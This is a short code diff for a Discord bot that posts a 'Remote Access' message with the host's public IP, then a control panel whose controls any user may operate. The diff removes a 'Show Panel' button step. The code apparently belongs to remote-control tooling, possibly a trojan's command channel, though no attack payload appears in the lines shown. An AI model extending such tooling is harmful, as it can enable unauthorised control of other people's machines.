@@ -99,35 +99,7 @@ async def on_ready():
         except:
             pass
         
-        # Send initial "Show Panel" button
-        try:
-            initial_embed = discord.Embed(
-                title="🎮 Remote Access",
-                description=f"Bot connected to: {public_ip}",
-                color=discord.Color.green(),
-                timestamp=datetime.datetime.now()
-            )
-            initial_embed.add_field(
-                name="Controls", 
-                value="Click 'Show Panel' to access all remote control features", 
-                inline=False
-            )
-        
-            view = InitialView()  # Single "Show Panel" button
-            await channel.send(embed=initial_embed, view=view)
-        except:
-            pass
-            
-
-
-class InitialView(discord.ui.View):
-    def __init__(self):
-        super().__init__()
-
-    @discord.ui.button(label="Show Panel", style=discord.ButtonStyle.green, emoji="🎮")
-    async def show_panel(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.defer()
-        
+        # Send control panel directly
         try:
             control_embed = discord.Embed(
                 title="🎮 Control Panel",
@@ -142,12 +114,13 @@ class InitialView(discord.ui.View):
             )
             
             view = ControlView(None)  # Allow any user to use controls
-            await interaction.followup.send(embed=control_embed, view=view)
-        except Exception as e:
-            try:
-                await interaction.followup.send(f"❌ Error loading panel: {str(e)}")
-            except:
-                await interaction.followup.send("❌ Unknown error occurred while loading panel")
+            await channel.send(embed=control_embed, view=view)
+        except:
+            pass
+            
+
+
+
 
 
 class ControlView(discord.ui.View):
